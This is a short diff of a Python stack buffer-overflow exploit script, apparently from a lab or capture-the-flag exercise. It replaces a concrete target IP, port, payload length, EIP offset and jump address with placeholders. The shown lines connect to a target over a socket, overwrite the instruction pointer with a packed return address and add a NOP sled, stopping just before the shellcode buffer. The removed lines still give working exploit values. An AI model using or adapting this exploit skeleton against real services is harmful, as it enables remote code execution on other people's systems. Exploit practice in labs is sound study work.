@@ -4,12 +4,12 @@ import socket
 import struct
 
 s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-s.connect(("10.185.10.55", 42424))
+s.connect(("XX.XX.XX.XX", PORT#))
 #s.connect(("192.168.1.132", 42424))
 
-total_length = 5002
-offset = 146
-new_eip = struct.pack("<I", 0x080416bf) #jump eip 080416bf 14c3
+total_length = XXXX
+offset = XXX
+new_eip = struct.pack("<I", <jmp eip here>) #jump eip 
 no_op = b"\x90" * 16
 
 buf =  b""
